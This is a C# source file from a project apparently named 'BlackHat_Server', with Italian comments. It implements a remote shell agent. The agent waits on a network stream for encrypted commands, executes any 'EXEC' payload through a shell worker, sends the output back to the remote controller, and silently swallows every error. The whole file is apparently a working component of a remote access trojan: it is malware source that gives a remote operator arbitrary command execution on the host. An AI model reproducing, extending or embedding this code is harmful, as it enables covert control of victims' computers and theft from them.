using System.Diagnostics;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace BlackHat_Server
{
    internal class RemoteShellAgent
    {
        private readonly MsgManager mm;

        private readonly NetworkStream myStream;

        private string sCmdEnd;

        private StringBuilder sLastOutPut = new StringBuilder(); // ULTIMO OUTPUT


        private bool stopListener;
        private readonly ShellWorker sw;

        public RemoteShellAgent(NetworkStream clientStream)
        {
            myStream = clientStream;
            mm = new MsgManager(clientStream);

            sw = new ShellWorker();

            //EVENTI
            sw.StdOut += RemShell_StdOut;
            sw.StdError += RemShell_StdError;

            sCmdEnd = sw.sCmdComplete; // COMANDO DI CONCLUSIONE
        }

        /// <summary>
        ///     Avvia thread di ascolto per Remote Shell
        /// </summary>
        public void StartShellListener()
        {
            var t = new Thread(ShellListener);
            t.IsBackground = true;
            t.Start();
        }


        /// <summary>
        ///     Listener Shell
        /// </summary>
        private void ShellListener()
        {
            while (ST_Client.Instance.isConnected && !stopListener)
                try
                {
                    Thread.Sleep(10);

                    var cmd = mm.WaitForEncryMessageRicorsive(10000);

                    if (stopListener)
                        break;

                    if (cmd != "TIMEOUT" && cmd != "__ERROR__")
                    {
                        var cmdSplit = cmd.Split('|');

                        switch (cmdSplit[0])
                        {
                            case "EXEC":
                                RunCmd(cmdSplit[1]);
                                break;

                            case "EXIT":
                                RunCmd("EXIT");
                                stopListener = true;
                                break;
                        }
                    }
                }
                catch
                {
                }

            // ARRIVO QUI PERCHè IL LISTENER è MORTO

            if (ST_Client.Instance.nsListaCanali.Contains(myStream))
                ST_Client.Instance.nsListaCanali.Remove(myStream);


            try
            {
                myStream.Close();
            }
            catch
            {
            }
        }
        //------------------------------------


        /// <summary>
        ///     Esegue un comando
        /// </summary>
        /// <param name="cmd"></param>
        private void RunCmd(string cmd)
        {
            try
            {
                sLastOutPut = new StringBuilder();
                sw.Execute(cmd);
            }
            catch
            {
            }
        }

        /// <summary>
        ///     Invio la risposta dell'ultima esecuzione
        /// </summary>
        private void SendAnswer()
        {
            try
            {
                mm.SendLargeEncryMessage(sLastOutPut.ToString(), 10000);
            }
            catch
            {
            }
        }

        /// <summary>
        ///     Evento richiamato quando arriva una nuova linea di output
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void RemShell_StdOut(object sender, DataReceivedEventArgs e)
        {
            var line = e.Data;

            if (line != sw.sCmdComplete)
                sLastOutPut.AppendLine(line);
            else
                SendAnswer();
        }

        private static void RemShell_StdError(object sender, DataReceivedEventArgs e)
        {
            //Console.ForegroundColor = ConsoleColor.Red;
            //Console.WriteLine(e.Data);
            //Console.ResetColor();
        }
    }
}